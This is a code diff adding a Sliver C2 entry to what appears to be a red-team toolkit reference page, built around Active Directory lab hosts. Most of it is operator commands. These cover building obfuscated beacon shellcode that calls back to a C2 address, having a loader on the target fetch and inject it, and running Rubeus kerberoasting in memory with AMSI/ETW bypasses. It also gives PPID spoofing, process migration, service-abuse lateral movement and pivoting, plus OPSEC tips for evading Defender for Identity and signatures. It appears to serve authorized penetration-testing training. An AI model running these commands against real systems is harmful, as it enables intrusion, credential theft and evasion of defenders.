@@ -1856,6 +1856,144 @@ var TOOLKIT = [
     category: "Command & Control",
     tools: [
       {
+        id: "sliver",
+        name: "Sliver",
+        url: "https://github.com/BishopFox/sliver",
+        description: "Open-source, cross-platform Command & Control framework for adversary simulation.",
+        brief: "Sliver is BishopFox's open-source, Go-based C2 framework and a common Cobalt Strike alternative on real engagements. A sliver-server runs listeners (HTTP(S), mTLS, DNS, WireGuard) and compiles obfuscated implants on demand; implants call back as quiet asynchronous beacons or interactive sessions, and the operator tasks them from a console that supports multiplayer.\n\nIts value on an AD engagement is in-memory tradecraft: execute-assembly and BOF/armory extensions run the standard C#/BOF toolset (Rubeus, SharpUp, Certify, service-abuse aliases) without dropping tools to disk, with fork-and-run or inline execution, PPID spoofing, and AMSI/ETW bypasses. TCP and named-pipe pivots fan C2 across a segmented network from a single foothold. The concepts are in the Theory section (C2 Frameworks, Sliver C2, In-Memory Tradecraft).",
+        quickReference: [
+          { label: "Start the server", cmd: "sudo ./sliver-server" },
+          { label: "Start an HTTPS listener", cmd: "https        # then: jobs" },
+          { label: "Generate a beacon (shellcode)", cmd: "generate -b https://<c2-ip> -e -f shellcode -N foothold -s ./Implants/foothold.bin" },
+          { label: "Interact with an implant", cmd: "sessions   |   beacons   |   use <id>" },
+          { label: "Run a .NET tool in memory", cmd: "execute-assembly -p explorer.exe -t 80 '/path/Rubeus.exe' 'triage'" }
+        ],
+        sections: [
+          {
+            title: "Setup & Deployment",
+            type: "commands",
+            commands: [
+              { label: "1. Start the Sliver C2 server (Linux/WSL — not Windows)", cmd: "# only sliver-server (C2) and sliver-client (multiplayer) binaries are needed\ncd /mnt/c/AD/Tools/Sliver\nsudo ./sliver-server\n[server] sliver >" },
+              { label: "2. Start an egress listener (HTTPS on :443) and list jobs", cmd: "[server] sliver > https\n[*] Starting HTTPS :443 listener ... started job #1\n[server] sliver > jobs        # list active listeners/jobs\n# other protocols: mtls / dns / wg  (custom or Let's Encrypt certs supported)" },
+              { label: "3. Generate a beacon implant as shellcode (obfuscated)", cmd: "generate -b https://<c2-ip> -e -f shellcode -N foothold \\\n  -s ./Implants/foothold.bin\n# -b beacon callback URL | -e symbol obfuscation/encoder | -f format | -N name | -s save path" },
+              { label: "4. Host payloads/tools to deliver to the target", cmd: "cd /mnt/c/AD/Tools/Sliver/Implants\npython3 -m http.server 8080        # or an HFS web server" },
+              { label: "5. Land the foothold (assumed breach) — inject the shellcode", cmd: "# on the target, a PE/shellcode loader pulls the hosted .bin and injects it:\nPS C:\\> C:\\AD\\Tools\\Sliver\\BinLoader.exe <c2-ip> 8080 foothold.bin\n# a new session/beacon appears in the Sliver console" },
+              { label: "6. Select and check the new implant", cmd: "[server] sliver > use <session-id>\n[server] sliver (foothold) > whoami\n[server] sliver (foothold) > armory install sharpup   # pull tools from the armory" }
+            ]
+          },
+          {
+            title: "generate — implant build flags",
+            type: "table",
+            columns: ["Flag", "Purpose"],
+            rows: [
+              ["-b <url>", "Beacon callback URL (asynchronous implant); use --mtls / --http / --dns for other protocols"],
+              ["-b vs session", "Omit -b / use session flags for an interactive session implant instead of a beacon"],
+              ["-f <format>", "Output format: exe, shared (dll), service, or shellcode"],
+              ["-e", "Enable symbol obfuscation and shellcode encoding (reduces static detection)"],
+              ["-N <name>", "Implant name"],
+              ["-s <path>", "Save the built implant to this path"],
+              ["--tcp-pivot <host:port>", "Build an implant that connects to a TCP pivot instead of the internet (internal hosts)"],
+              ["profiles / stager", "Save a build recipe as a profile; build a small stager that pulls the full implant over C2"]
+            ]
+          },
+          {
+            title: "Sessions, Beacons & Host Info",
+            type: "commands",
+            commands: [
+              { label: "List and select implants", cmd: "sessions                 # interactive sessions\nbeacons                  # asynchronous beacons\nuse <id>                 # select an implant; all commands scope to it\nsessions -i <id>         # interact with a specific session\ninfo                     # details about the current implant" },
+              { label: "Basic host / identity", cmd: "whoami                   # current token identity\nps                       # process list\nps -e explorer.exe       # filter by name\nps -c -o 'DOMAIN\\user'   # find processes owned by a specific user (for token/migration targets)" },
+              { label: "Registry", cmd: "registry read  --hive HKLM \"System\\\\...\"\nregistry write --hive HKLM --type dword \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DsrmAdminLogonBehavior\" 2" }
+            ]
+          },
+          {
+            title: "Process Injection, Migration & PPID",
+            type: "commands",
+            commands: [
+              { label: "Migrate the implant into another process", cmd: "migrate -p <pid> -t 200      # migrate into a running PID (200s timeout)\nmigrate -n taskhostw.exe     # migrate by process name\n# common blend-in hosts: svchost.exe, dllhost.exe, RuntimeBroker.exe, taskhostw.exe" },
+              { label: "PPID spoofing when running tools (fork-and-run)", cmd: "# -p sets the parent process to spoof so the sacrificial child looks legitimate\nexecute-assembly -p explorer.exe -t 80 '/path/Tool.exe' 'args'\nexecute-assembly -P <ppid> -p <proc> -t 80 '/path/Tool.exe' 'args'   # numeric PPID" }
+            ]
+          },
+          {
+            title: "Tool Execution (execute-assembly / execute)",
+            type: "commands",
+            commands: [
+              { label: "Run a .NET assembly in memory (fork-and-run, PPID-spoofed)", cmd: "# spawns a sacrificial process, injects the tool, runs it, returns output, kills it\nexecute-assembly -p explorer.exe -t 80 '/mnt/c/AD/Tools/Sliver/StandIn.exe' '--all'\nexecute-assembly -p taskhostw.exe -t 180 '/mnt/c/AD/Tools/Sliver/Rubeus.exe' 'kerberoast'" },
+              { label: "Inline / self-inject (no new process) with AMSI + ETW bypass", cmd: "# -i in-process (self-inject) | -M AMSI bypass | -E ETW bypass | -t timeout\nexecute-assembly -i -M -E -t 80 '/mnt/c/AD/Tools/Sliver/SharpView.exe' 'Get-DomainSID -verbose'\nexecute-assembly -i -M -t 80 '/mnt/c/AD/Tools/Sliver/PowerUpSQLEx.exe'" },
+              { label: "Run OS commands / lateral movement via execute + winrs", cmd: "execute -o -t 40 cmd /c \"net share studentshareX=C:\\...\"       # -o capture output\nexecute -o -S -t 180 winrs -r:dcorp-ci cmd /c \"whoami\"          # -S save, remote WinRM shell" },
+              { label: "LDAP-driven enumeration (StandIn / ADSearch / SharpView)", cmd: "# tools that take raw LDAP queries replace detected PowerView/SharpView usage\nexecute-assembly -p explorer.exe -t 80 '/path/ADSearch.exe' '--search \"(objectClass=user)\"'\n# NOTE: consecutive LDAP queries trip MDI/ATP — pace enumeration over long intervals" }
+            ]
+          },
+          {
+            title: "execute-assembly — key flags",
+            type: "table",
+            columns: ["Flag", "Meaning"],
+            rows: [
+              ["-p <proc>", "PPID-spoof / sacrificial parent process for fork-and-run (e.g. explorer.exe)"],
+              ["-P <ppid>", "Numeric parent PID to spoof"],
+              ["-i", "In-process / self-inject — run inside the implant's process, no new process (quieter, riskier)"],
+              ["-M", "Apply the in-built AMSI bypass (for inline execution)"],
+              ["-E", "Apply the in-built ETW bypass (for inline execution)"],
+              ["-t <secs>", "Timeout for the task"],
+              ["inline-execute-assembly", "Variant purpose-built for self-injection to avoid the fork-and-run technique"]
+            ]
+          },
+          {
+            title: "File Operations",
+            type: "commands",
+            commands: [
+              { label: "Browse and read remote files / shares", cmd: "ls '\\\\dcorp-dc\\c$'\ncat '\\\\eurocorp-dc.eurocorp.local\\SharedwithDCorp\\flag.txt'\ncd \"C:\\WebServer\\Abyss Web Server\"" },
+              { label: "Upload tools/payloads to the target; make directories", cmd: "upload -t 180 '/mnt/c/AD/Tools/Sliver/Loader.exe' 'C:\\Windows\\Temp\\Loader.exe'\nmkdir 'C:\\AD\\Tools\\Sliver\\studentshareX'\ndownload '\\\\host\\c$\\path\\file'" }
+            ]
+          },
+          {
+            title: "Armory & Extensions (aliases / BOFs)",
+            type: "commands",
+            commands: [
+              { label: "Install tools from the armory (they become native commands)", cmd: "armory install sharpup        # .NET alias\narmory install <name>         # aliases (SharpX) and extensions (BOF/COFF)" },
+              { label: "Service-abuse & enumeration aliases used for lateral movement", cmd: "sa-sc-enum <host>                                  # enumerate services on a host\nremote-sc-config -t 100 <host> '<svc>' '<binpath>' # reconfigure a remote service\nremote-sc-start  -t 100 <host> '<svc>'             # start it (trigger the payload)\nremote-sc-stop   -t 100 <host> '<svc>'             # stop it\nscshell -t 180 <host> <existing-service>           # SCShell fileless lateral movement" },
+              { label: "Share / task enumeration aliases", cmd: "sa-netshares -t 60 <host>                          # enumerate network shares\nsa-schtasksenum -t 40 <host>                       # enumerate scheduled tasks" }
+            ]
+          },
+          {
+            title: "Pivoting (segmented networks)",
+            type: "commands",
+            commands: [
+              { label: "Open a pivot listener on the foothold", cmd: "pivots tcp --lport 443        # TCP pivot on the foothold\npivots tcp -l 8084            # (short form)\npivots                        # list active pivots\n# named-pipe pivots carry C2 over SMB and blend as normal Windows IPC" },
+              { label: "Build an internal implant that connects to the pivot", cmd: "# internal hosts can't egress — they beacon to the foothold's pivot, which relays to C2\ngenerate --tcp-pivot <foothold-ip>:8084 -e -f exe -N internal -s ./Implants/internal.exe" }
+            ]
+          },
+          {
+            title: "Multiplayer & Operators",
+            type: "commands",
+            commands: [
+              { label: "Enable multiplayer and add an operator", cmd: "[server] sliver > multiplayer                       # enable the multiplayer listener\n[server] sliver > new-operator --name m3rcer --lhost <c2-ip>\n# hand the generated .cfg to the operator; they connect with sliver-client import <cfg>" }
+            ]
+          },
+          {
+            title: "OPSEC Notes",
+            type: "notes",
+            items: [
+              "Beacon with a long sleep + jitter for stealth; switch to an interactive session only for short hands-on-keyboard bursts.",
+              "Prefer inline execute-assembly (-i) with AMSI/ETW bypass for the quietest execution, but remember a crash takes the implant — fork-and-run is the safer default.",
+              "PPID-spoof to a legitimate parent (explorer.exe, taskhostw.exe) so fork-and-run children don't create suspicious process lineage.",
+              "Consecutive LDAP queries from enumeration tools trip Microsoft Defender for Identity / ATP — pace enumeration over long intervals on a real engagement.",
+              "Run only one egress channel (the foothold) and pivot everything else internally over TCP/named-pipe to keep the network footprint small.",
+              "Change default certificates, ports, URIs and pipe names — framework defaults are widely signatured; obfuscate implants (-e) so builds aren't hash-identical."
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "Sliver — GitHub (BishopFox)", url: "https://github.com/BishopFox/sliver" },
+              { label: "Sliver — official wiki / documentation", url: "https://sliver.sh/docs" },
+              { label: "Theory — Sliver C2 Architecture", url: "theory/2026-09-23-sliver-c2.html" },
+              { label: "Theory — In-Memory Post-Exploitation Tradecraft", url: "theory/2026-09-23-in-memory-tradecraft.html" }
+            ]
+          }
+        ]
+      },
+      {
         id: "adaptix-c2",
         name: "Adaptix C2",
         url: "https://github.com/Adaptix-Framework/AdaptixC2",
